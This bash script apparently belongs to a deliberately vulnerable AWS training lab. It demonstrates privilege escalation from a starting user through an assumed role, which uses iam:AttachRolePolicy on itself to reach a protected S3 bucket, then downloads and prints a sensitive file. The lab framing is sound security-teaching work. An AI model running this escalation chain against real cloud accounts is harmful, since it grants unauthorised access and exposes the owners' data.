#!/bin/bash

# Demo script for iam:AttachRolePolicy privilege escalation to S3 bucket
# This is a ROLE-BASED self-escalation scenario

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-arp-to-bucket-starting-user"
STARTING_ROLE="pl-prod-arp-to-bucket-starting-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based Self-Escalation to S3 Bucket${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_bucket_iam_attachrolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and ARNs
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
BUCKET_ACCESS_POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_access_policy_arn')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $STARTING_ROLE_ARN"

ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "arp-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# Step 4: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
echo "Attempting to list S3 bucket contents (should fail)..."
if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket yet${NC}"
fi
echo ""

# Step 5: Perform privilege escalation via AttachRolePolicy
echo -e "${YELLOW}Step 5: Escalating privileges via iam:AttachRolePolicy${NC}"
echo "Attaching S3 bucket access policy to self..."
echo "Policy ARN: $BUCKET_ACCESS_POLICY_ARN"

aws iam attach-role-policy \
    --role-name "$STARTING_ROLE" \
    --policy-arn "$BUCKET_ACCESS_POLICY_ARN"

echo -e "${GREEN}✓ Successfully attached S3 access policy to self!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# Step 6: Verify S3 bucket access
echo -e "${YELLOW}Step 6: Verifying S3 bucket access${NC}"
echo "Target bucket: $BUCKET_NAME"
echo "Listing bucket contents..."

aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"

# Step 7: Download sensitive data
echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/arp-sensitive-data.txt"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:AttachRolePolicy${NC} to attach S3 access policy to self"
echo -e "Step 3: Accessed ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → S3 Bucket"
echo ""
echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the escalated policy${NC}"
echo ""
